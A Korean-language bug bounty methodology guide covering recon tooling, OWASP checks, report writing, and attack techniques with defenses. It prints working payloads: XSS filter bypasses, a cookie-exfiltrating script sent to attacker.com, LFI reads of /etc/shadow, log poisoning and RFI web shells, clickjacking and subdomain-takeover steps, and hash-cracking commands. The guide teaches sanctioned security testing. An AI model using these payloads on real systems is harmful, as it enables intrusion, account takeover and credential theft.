# 버그바운티 방법론 — 입문부터 High Severity까지

## 1. 버그바운티란

```
기업이 자사 서비스의 취약점을 발견한 외부 연구자에게 보상금 지급하는 프로그램

장점:
  연구자 → 합법적으로 해킹 기술 실전 적용 + 수익
  기업   → 내부 팀으로 찾기 어려운 취약점 발굴

주요 플랫폼:
  HackerOne   : hackerone.com  (가장 큰 플랫폼, Meta·Twitter·Uber 등)
  Bugcrowd    : bugcrowd.com   (NASA, Mastercard 등)
  Intigriti   : intigriti.com  (유럽 중심)
  Synack       : synack.com    (초청제, 고급 연구자 대상)
  자체 프로그램 : Google VRP, Microsoft MSRC, Apple Security Bounty
```

---

## 2. 플랫폼별 시작 방법

### HackerOne 시작
```
1. hackerone.com 가입
2. Hacker101 CTF (무료 교육 + 포인트 적립)
   → 포인트 쌓으면 비공개 프로그램 초대
3. 공개 프로그램 → Scope 범위 확인 후 시작
4. Reputation 쌓기 → 비공개(Private) 프로그램 접근

권장 첫 타겟:
  - 비교적 넓은 스코프의 프로그램
  - 자산이 많은 대기업 (서브도메인 많음)
  - 오래됐지만 활발한 프로그램
```

### 보상금 기준 (참고)
```
Critical  (CVSS 9.0~10.0) : $5,000 ~ $50,000+
High      (CVSS 7.0~8.9)  : $1,000 ~ $10,000
Medium    (CVSS 4.0~6.9)  : $200  ~ $2,000
Low       (CVSS 0.1~3.9)  : $50   ~ $500
Informational             : 보통 무보상, 감사 표시
```

---

## 3. 정찰 (Recon) — 자산 발굴

### 3-1. 서브도메인 열거

```bash
# amass (가장 강력)
amass enum -d target.com -o subdomains.txt
amass enum -passive -d target.com  # 패시브만

# subfinder + httpx (살아있는 서브도메인만)
subfinder -d target.com -silent | httpx -silent -status-code -title -tech-detect

# 인증서 투명성 로그 (crt.sh)
curl -s "https://crt.sh/?q=%.target.com&output=json" | \
  python3 -c "import sys,json; [print(e['name_value']) for e in json.load(sys.stdin)]" | \
  sort -u > crt_subs.txt

# 서브도메인 브루트포싱
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
     -u "https://FUZZ.target.com" -mc 200,301,302,403

# 전체 통합 파이프라인
subfinder -d target.com -silent | anew subs.txt
amass enum -passive -d target.com | anew subs.txt
cat subs.txt | httpx -silent | anew live_subs.txt
```

### 3-2. URL/파라미터 수집

```bash
# waybackurls (아카이브에서 URL)
echo "target.com" | waybackurls | tee wayback_urls.txt

# gau (다양한 소스)
gau target.com | tee gau_urls.txt

# katana (크롤러)
katana -u https://target.com -d 5 -o katana_urls.txt

# 파라미터만 추출
cat wayback_urls.txt gau_urls.txt | grep "?" | qsreplace FUZZ | sort -u > params.txt

# JS 파일에서 엔드포인트 추출
cat live_subs.txt | getJS | grep "\.js$" | xargs -I{} sh -c 'curl -s {} | python3 -m jsbeautifier | grep -E "api|endpoint|route|path"'
```

### 3-3. 기술 스택 파악

```bash
# whatweb
whatweb https://target.com -a 3

# wappalyzer CLI
npx wappalyzer https://target.com

# nuclei 기술 탐지
nuclei -u https://target.com -t technologies/ -o tech.txt

# HTTP 응답 헤더 분석
curl -I https://target.com 2>/dev/null | grep -E "Server|X-Powered|X-Framework|Via"
```

---

## 4. 취약점 발굴 전략

### 4-1. OWASP Top 10 체크리스트

```
각 자산마다 빠르게 확인할 항목:

□ Broken Access Control
  - /admin, /dashboard, /api/users/{id} 직접 접근
  - 다른 사용자 ID로 교체 (IDOR: Insecure Direct Object Reference)
  - 권한이 필요한 기능을 일반 계정으로 접근

□ SQL Injection
  - 파라미터에 ' 삽입 → 오류 확인
  - 정렬/검색 파라미터 (ORDER BY, 검색어)
  - JSON 파라미터, 헤더 (X-Forwarded-For, User-Agent)

□ XSS (Cross-Site Scripting)
  - 검색어, 댓글, 프로필 이름, 에러 메시지
  - DOM 기반: URL fragment (#), location.hash
  - 필터 우회: SVG, 이벤트 핸들러, base64

□ 인증/세션 취약점
  - 비밀번호 재설정 로직 (토큰 재사용, 예측 가능)
  - 2FA 우회 (레이스 컨디션, 재사용)
  - JWT: alg:none, HS256→RS256 혼동, 비밀키 브루트포스

□ SSRF
  - URL 입력 받는 기능 (썸네일, 웹훅, PDF 생성)
  - http://169.254.169.254/ 클라우드 메타데이터
  - 내부망 탐색

□ 파일 업로드
  - Content-Type 변조, 확장자 필터 우회
  - 업로드 경로 유추 → 웹쉘 실행

□ IDOR (Broken Access Control 세부)
  - 숫자 ID를 다른 숫자로 변경
  - UUID는 어디서 새는지 확인
  - API 엔드포인트: GET /api/orders/12345
```

### 4-2. IDOR — 버그바운티에서 가장 많이 나오는 취약점

```
IDOR (Insecure Direct Object Reference):
다른 사용자의 리소스에 직접 접근 가능한 취약점

발굴 방법:
1. 계정 2개 생성 (Account A, Account B)
2. Account A로 로그인 → 자신의 리소스 URL 확인
   예: GET /api/v1/users/1001/profile
3. Account B 세션으로 Account A URL 접근
   → 접근 가능하면 IDOR!

찾기 좋은 곳:
- 프로필 수정/조회
- 주문 내역, 결제 정보
- 파일 다운로드
- API 엔드포인트 (숫자 ID, UUID)
- 이메일 수신함

자동화:
# Autorize (Burp Suite 확장)
# 두 세션 설정 → 모든 요청 자동으로 권한 확인
```

### 4-3. XSS — 필터 우회 전략

```
기본 테스트:
<script>alert(1)</script>
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>

필터 우회:
# HTML 태그 필터링 시
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
<details open ontoggle=alert(1)>
<video autoplay onloadstart=alert(1) src=x>

# script 키워드 필터링 시
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
<svg><use href="data:image/svg+xml;base64,...#x"/></svg>

# XSS 파이어폴 우회
<scRiPt>alert(1)</scRiPt>
<script/x>alert(1)</script>
<script>/*</script><script>*/alert(1)</script>

# DOM XSS 탐지
# Burp DOM Invader 사용
# 카나리 문자열 주입 후 JS 소스에서 추적
```

### 4-4. 비밀번호 재설정 취약점

```
취약한 패턴들:

[1] 토큰 재사용
   - 비밀번호 재설정 후 이전 토큰으로 다시 변경 가능?

[2] 토큰 무한 유효
   - 오래된 토큰이 만료되지 않는 경우

[3] 레이스 컨디션
   - 동시에 여러 재설정 요청 → 같은 토큰이 여러 계정에?

[4] Host Header Injection
   POST /reset-password HTTP/1.1
   Host: attacker.com
   → 이메일에 attacker.com 링크 발송

[5] 예측 가능한 토큰
   - 시간 기반 (timestamp MD5)
   - 사용자 ID 기반
```

---

## 5. Burp Suite 버그바운티 설정

### 5-1. 필수 확장 플러그인

```
BApp Store에서 설치:

1. Autorize          → IDOR/권한 확인 자동화
2. Param Miner       → 숨겨진 파라미터 자동 발굴
3. Retire.js         → 취약한 JS 라이브러리 탐지
4. J2EEScan          → Java 특화 취약점
5. Active Scan++     → 활성 스캔 강화
6. Reflected Parameters → 반사형 파라미터 추적
7. Error Message Checks → 에러 메시지 정보 누수
8. Software Vulnerability Scanner → CVE 매핑
9. Turbo Intruder    → 고속 브루트포서 (레이스 컨디션)
10. Logger++         → 모든 요청 로깅
```

### 5-2. 범위(Scope) 설정

```
Target → Scope 설정:
1. Add → 타겟 도메인 추가
2. 서브도메인 와일드카드: .*\.target\.com$
3. Spider와 Scanner를 스코프 내로 제한

중요: 스코프 밖 요청 절대 금지!
→ HackerOne 규정 위반 → 계정 정지 위험
```

### 5-3. Turbo Intruder로 레이스 컨디션

```python
# 쿠폰 코드 중복 사용 테스트
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=True)
    
    for i in range(50):
        engine.queue(target.req, gate='race1')
    
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

---

## 6. 리포트 작성 — 수락률 높이는 방법

### 6-1. 좋은 리포트 구조

```markdown
## 취약점 요약
[취약점 유형] in [컴포넌트] — [한 줄 영향 요약]
예: Stored XSS in /profile/bio allows Session Hijacking

## 심각도: High (CVSS 3.1: 8.1)

## 영향
- 공격자가 피해자의 세션 쿠키를 탈취하여 계정 탈취 가능
- 관리자 계정 탈취 시 전체 시스템 위협

## 취약한 엔드포인트
POST /api/v1/profile/update
파라미터: bio

## 재현 단계
1. 피해자 계정으로 로그인
2. 프로필 수정 → bio 필드에 다음 입력:
   <img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">
3. 변경 저장
4. 다른 사용자가 프로필 방문 시 쿠키 자동 전송

## PoC
[스크린샷 또는 영상 첨부]
쿠키 수신 서버 로그:
[2024-01-15 10:23:45] GET /?c=sessionid=abc123def456

## 수정 권고
bio 필드 저장 시 HTML 특수문자 인코딩:
& → &amp;  < → &lt;  > → &gt;  " → &quot;

## 참고
- OWASP: https://owasp.org/www-community/attacks/xss/
- CWE-79: Improper Neutralization of Input
```

### 6-2. 거절 피하는 방법

```
자주 거절되는 이유:

✗ "Self-XSS" — 자신의 계정에만 영향
  → 반드시 다른 사용자에게 영향을 미쳐야 함

✗ "Missing security header" (정보성)
  → 실제 익스플로잇 가능성 증명 필요

✗ "Rate limiting not implemented"
  → 실제 공격 시나리오와 영향 구체화 필요

✗ "Out of scope"
  → 항상 scope 먼저 확인

✗ "Already known" (duplicate)
  → 제보 전 유사 보고서 검색

✗ 재현 불가
  → 단계별 상세 기록, 스크린샷/영상 첨부 필수
```

---

## 7. 자동화 도구 모음

```bash
# Nuclei — 다목적 취약점 스캐너 (템플릿 기반)
nuclei -u https://target.com -t cves/ -o nuclei_cves.txt
nuclei -u https://target.com -t exposures/ -severity high,critical
nuclei -l live_subs.txt -t vulnerabilities/ -rate-limit 50

# ffuf — 웹 퍼저
# 디렉토리
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt \
     -u https://target.com/FUZZ -mc 200,301,302 -o dirs.json

# 파라미터
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -u "https://target.com/page?FUZZ=test" -mc 200 -fs [기본크기]

# 서브도메인 VHOST
ffuf -w subdomains.txt -H "Host: FUZZ.target.com" \
     -u https://target.com -mc 200 -fs [기본크기]

# dalfox — XSS 자동화
dalfox url "https://target.com/search?q=FUZZ"
dalfox file params.txt --deep-domxss

# sqlmap (허가된 대상만)
sqlmap -u "https://target.com/page?id=1" --dbs --batch --level=3

# gitleaks — GitHub 비밀 정보 탐지
gitleaks detect --source /path/to/repo
gitleaks github --org=target-company

# trufflehog
trufflehog git https://github.com/target-org/target-repo
```

---

## 8. 버그바운티 수익화 전략

```
초보자 전략:
1. HackerOne Hacker101 CTF 완료 → 비공개 프로그램 초대 획득
2. 낮은 경쟁의 새 프로그램 노리기
3. 넓은 스코프 프로그램 우선
4. 서브도메인 중 잘 관리 안 되는 것 집중

중급자 전략:
1. 자동화 파이프라인 구축 (amass → httpx → nuclei)
2. 프로그램 역사 분석 (과거 제보 패턴 파악)
3. 특정 기술 스택 특화 (GraphQL, OAuth, JWT 등)
4. 체이닝으로 High/Critical 올리기

체이닝 예시:
SSRF (Medium) + AWS 메타데이터 접근 (High) + IAM 자격증명 탈취 (Critical)
정보 노출 (Low) + 계정 탈취로 연결 (High)
```

---

## 8-2. CMS 해킹 방법론 (Bug Bounty 관점)

### WordPress 취약점 탐지
```bash
# WPScan — WordPress 전용 취약점 스캐너
wpscan --url https://target.com
wpscan --url https://target.com --enumerate p  # 플러그인 열거
wpscan --url https://target.com --enumerate u  # 사용자 열거
wpscan --url https://target.com -P wordlist.txt --username admin  # 패스워드 브루트포스

# 플러그인 버전 확인 → ExploitDB 검색
wpscan --url https://target.com --enumerate p --plugins-detection aggressive

# XML-RPC 취약점 확인
curl -X POST https://target.com/xmlrpc.php \
  -d '<methodCall><methodName>system.listMethods</methodName></methodCall>'
# XML-RPC 활성화 시 → 브루트포스, SSRF 등에 활용 가능
```

### Drupal / Joomla 취약점 탐지
```bash
# Droopescan — Drupal 스캐너
droopescan scan drupal -u https://target.com

# Joomscan — Joomla 스캐너
joomscan -u https://target.com

# 공통 CMS 취약점 탐색 (Nuclei)
nuclei -u https://target.com -tags cms,wordpress,drupal,joomla
```

### 알려진 취약점(1-day) 활용 방법론
```
1. 기술 스택 식별
   → Wappalyzer, WhatWeb, HTTP 응답 헤더 분석

2. 버전 특정
   → /readme.txt, /CHANGELOG.txt, /admin/modules 경로 확인
   → HTTP 응답의 X-Powered-By, Generator 메타태그

3. 취약점 검색
   → searchsploit "[CMS명] [버전]"
   → https://nvd.nist.gov/vuln/search
   → https://www.exploit-db.com/
   → GitHub: site:github.com "CVE-20XX-XXXXX"

4. POC 확보 및 테스트
   → GitHub에서 POC 코드 검색 (신뢰할 수 없는 POC 주의!)
   → 로컬 테스트 환경에서 먼저 검증

5. 1-day 추적 전략
   → ExploitDB RSS, Twitter 위협 피드 모니터링
   → 새 CVE 발표 후 빠르게 타겟 스캔 (패치 전 타임윈도우)
```

---

## 8-3. GitHub / 서브도메인 탈취 (Subdomain Takeover)

```bash
# 서브도메인 탈취 취약점 탐지
# CNAME이 외부 서비스를 가리키지만 해당 서비스에 등록 안 된 경우

# 취약한 패턴 확인
dig sub.target.com CNAME
# → CNAME: some-name.github.io (GitHub Pages, 미등록)
# → CNAME: bucket.s3.amazonaws.com (S3, 미생성)
# → CNAME: target.herokuapp.com (Heroku, 미등록)

# 자동 탐지 도구
subjack -w subdomains.txt -t 100 -o takeover_results.txt
subzy run --targets subdomains.txt

# GitHub Pages 탈취 (CNAME 미등록 시)
# 1. GitHub 계정 생성
# 2. 동일한 이름의 저장소 생성
# 3. GitHub Pages 활성화
# 4. 타겟 서브도메인이 공격자 페이지를 가리킴

# S3 버킷 탈취
# 1. 버킷 이름과 동일한 S3 버킷 생성 (같은 리전)
# 2. 피싱 페이지 업로드
```

---

## 9. Host Header Injection

### 공격 원리
```
HTTP Host 헤더를 서버가 그대로 신뢰하여 처리할 때 발생
→ 비밀번호 재설정 링크, 캐시 포이즈닝, SSRF 등에 악용 가능
```

### Host Header Injection 기법
```http
# 1. 비밀번호 재설정 링크 변조
POST /reset-password HTTP/1.1
Host: attacker.com         ← 변조

이메일로 발송되는 링크:
https://attacker.com/reset?token=abc123  ← 공격자 도메인 포함

# 2. X-Forwarded-Host 사용
POST /reset-password HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com   ← 프록시 헤더 악용

# 3. 포트 번호 주입
Host: target.com:@attacker.com

# 4. 서브도메인 추가
Host: attacker.com.target.com

# 5. 중복 Host 헤더
Host: target.com
Host: attacker.com   ← 두 번째 Host가 우선 처리될 수 있음
```

### 캐시 포이즈닝 (Host Header → Web Cache Poisoning)
```bash
# CDN/리버스 프록시가 Host 헤더를 응답에 반영하면서 캐시할 때
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com"><script>alert(1)</script>

# 응답이 캐시되면 → 다른 사용자도 XSS 영향을 받음
```

### Host Header Injection 방어
```python
# Flask: 허용된 호스트 화이트리스트
ALLOWED_HOSTS = ['target.com', 'www.target.com']

@app.before_request
def check_host():
    if request.host not in ALLOWED_HOSTS:
        abort(400)

# Django: ALLOWED_HOSTS 설정
ALLOWED_HOSTS = ['target.com', 'www.target.com']

# 비밀번호 재설정 URL을 환경변수로 하드코딩
RESET_BASE_URL = 'https://target.com/reset'
```

---

## 10. Clickjacking

### 공격 원리
```
피해자 사이트를 투명한 iframe으로 겹쳐 놓고
사용자가 자신도 모르게 클릭하도록 유도

공격 흐름:
1. 공격자 → 악성 페이지 제작
2. 페이지에 target.com을 투명 iframe으로 삽입
3. 피해자를 악성 페이지로 유인
4. 피해자가 버튼을 누르면 실제로 target.com의 동작 수행
   (송금, 설정 변경, 계정 삭제 등)
```

### Clickjacking PoC
```html
<!DOCTYPE html>
<html>
<head>
  <style>
    #target-frame {
      opacity: 0.0;       /* 완전 투명 (실제 공격) */
      /* opacity: 0.5;    시연용 반투명 */
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 2;
    }
    #decoy-content {
      position: absolute;
      top: 100px;
      left: 200px;
      z-index: 1;
      font-size: 24px;
    }
  </style>
</head>
<body>
  <!-- 피해자에게 보이는 가짜 버튼 -->
  <div id="decoy-content">
    <h2>무료 경품 받기!</h2>
    <button style="padding:20px;font-size:20px">클릭하세요!</button>
  </div>
  
  <!-- 투명하게 겹친 실제 타겟 사이트 -->
  <iframe id="target-frame"
          src="https://target.com/account/delete"
          scrolling="no">
  </iframe>
</body>
</html>
```

### Clickjacking 탐지
```bash
# X-Frame-Options 헤더 확인
curl -I https://target.com | grep -i "x-frame\|frame-ancestors"

# 취약한 응답: 헤더 없음 또는
X-Frame-Options: ALLOWALL

# 안전한 응답
X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN
Content-Security-Policy: frame-ancestors 'none'
```

### Clickjacking 방어
```http
# 서버 응답 헤더 추가
X-Frame-Options: DENY          # 모든 사이트에서 iframe 금지
X-Frame-Options: SAMEORIGIN    # 동일 도메인만 iframe 허용

# 더 유연한 CSP 방식 (권장)
Content-Security-Policy: frame-ancestors 'none';
Content-Security-Policy: frame-ancestors 'self' https://trusted.com;
```

```javascript
// Frame busting (구식, 권장하지 않음)
if (window.top !== window.self) {
    window.top.location = window.self.location;
}
```

---

## 11. Session Fixation (세션 고정)

### 공격 원리
```
1. 공격자 → 자신의 세션 ID 확보
2. 공격자 → 피해자에게 해당 세션 ID를 사용하도록 강제
3. 피해자 → 해당 세션 ID로 로그인
4. 공격자 → 같은 세션 ID로 피해자 계정에 접근
```

### Session Fixation 시나리오
```
취약한 플로우:
1. 미인증 사용자에게 세션 발급: PHPSESSID=ATTACKER_KNOWN_ID
2. URL 파라미터로 세션 전달:
   http://target.com/login?PHPSESSID=fixed_session_id
3. 피해자가 해당 URL로 로그인 완료
4. 서버가 로그인 후 세션 ID를 재발급하지 않음
5. 공격자가 ATTACKER_KNOWN_ID로 피해자 계정 접근
```

### 탐지 방법
```bash
# 1. 로그인 전후 세션 ID 비교
# Before login:
Set-Cookie: session=BEFORE_LOGIN_ID

# After login:
Set-Cookie: session=BEFORE_LOGIN_ID  ← 세션 ID가 동일 → 취약!
# 안전: Set-Cookie: session=AFTER_LOGIN_NEW_ID ← 다른 ID 발급

# 2. URL 파라미터로 세션 수락 여부 테스트
GET /login?PHPSESSID=test123 HTTP/1.1
# 로그인 후 test123이 유지되면 → Session Fixation 취약
```

### Session Fixation 방어
```php
// PHP: 로그인 성공 후 반드시 세션 재생성
session_start();
// ... 로그인 검증 ...
if (login_successful) {
    session_regenerate_id(true);  // 새 세션 ID 발급, 이전 세션 삭제
    $_SESSION['user'] = $user_id;
}
```

---

## 12. LFI / RFI (파일 인클루전 취약점)

### LFI (Local File Inclusion)
```bash
# 기본 LFI
http://target.com/?page=../../../etc/passwd
http://target.com/?file=../../../../etc/shadow

# 인코딩 우회
http://target.com/?page=..%2F..%2F..%2Fetc%2Fpasswd
http://target.com/?page=%2e%2e%2f%2e%2e%2fetc%2fpasswd
http://target.com/?page=....//....//etc/passwd   (중복 슬래시 필터 우회)

# Null byte 우회 (PHP 5.3 이하)
http://target.com/?page=../../../etc/passwd%00
http://target.com/?page=../../../etc/passwd%00.jpg

# 경로 잘라내기 (Path Truncation — PHP 특유)
http://target.com/?page=../../../etc/passwd.......................

# 타겟 파일 목록
/etc/passwd          (사용자 계정 정보)
/etc/hosts           (호스트 파일)
/etc/ssh/sshd_config (SSH 설정)
/proc/self/environ   (환경 변수 — PHP 코드 삽입 가능)
/var/log/apache2/access.log   (로그 포이즈닝 대상)
/var/log/nginx/access.log
/proc/self/fd/2      (stderr)
/var/mail/www-data
```

### LFI → RCE (Log Poisoning)
```bash
# 1단계: 로그 파일에 PHP 코드 삽입
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# 2단계: LFI로 로그 파일 실행
http://target.com/?page=../../../../var/log/apache2/access.log&cmd=id

# PHP Session 파일 인젝션
# PHP 세션 파일 위치: /tmp/sess_[SESSION_ID]
# 세션에 PHP 코드 저장 후 LFI로 실행
```

### RFI (Remote File Inclusion)
```bash
# 기본 RFI (allow_url_include=On 설정 시)
http://target.com/?page=http://attacker.com/shell.php
http://target.com/?page=ftp://attacker.com/shell.php

# attacker.com/shell.php 내용
<?php system($_GET['cmd']); ?>

# SMB를 통한 RFI (Windows)
http://target.com/?page=\\attacker.com\share\shell.php

# Data URI를 이용한 LFI/RFI 우회
http://target.com/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
```

### LFI/RFI 방어
```php
// PHP: 화이트리스트 방식
$allowed_pages = ['home', 'about', 'contact'];
$page = $_GET['page'];

if (!in_array($page, $allowed_pages)) {
    die('Invalid page');
}

include('pages/' . $page . '.php');

// realpath()로 경로 탐색 방지
$base = realpath('/var/www/html/pages/');
$file = realpath($base . '/' . $page . '.php');

if (strpos($file, $base) !== 0) {
    die('Path traversal detected!');
}

// PHP 설정
// allow_url_include = Off  (RFI 차단)
// allow_url_fopen = Off    (원격 파일 차단)
```

---

## 13. 패스워드 크래킹 기법

### 오프라인 크래킹 도구
```bash
# Hashcat — GPU 기반 고속 크래킹
# MD5 크래킹
hashcat -a 0 -m 0 hashes.txt wordlist.txt

# SHA-256
hashcat -a 0 -m 1400 hashes.txt wordlist.txt

# bcrypt ($2a$)
hashcat -a 0 -m 3200 hashes.txt wordlist.txt

# NTLM (Windows 해시)
hashcat -a 0 -m 1000 ntlm_hashes.txt wordlist.txt

# 규칙 기반 (변형 적용)
hashcat -a 0 -m 0 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# 브루트포스 (마스크 어택)
hashcat -a 3 -m 0 hashes.txt ?a?a?a?a?a?a?a?a  (8자 모든 문자)
hashcat -a 3 -m 0 hashes.txt ?d?d?d?d?d?d       (6자리 숫자)

# John the Ripper
john --wordlist=wordlist.txt hashes.txt
john --format=md5 hashes.txt --wordlist=rockyou.txt
john --rules --wordlist=wordlist.txt hashes.txt  # 규칙 적용
```

### 해시 식별
```bash
# hashid로 해시 유형 식별
hashid 5f4dcc3b5aa765d61d8327deb882cf99
# → MD5, Domain Cached Credentials

# hash-identifier
python3 hash-identifier.py

# 주요 해시 형식
$1$   → MD5 (Linux)
$2a$  → bcrypt
$5$   → SHA-256 (Linux)
$6$   → SHA-512 (Linux)
$y$   → yescrypt
NTLM  → aad3b435b51404eeaad3b435b51404ee:hash (Windows)
```
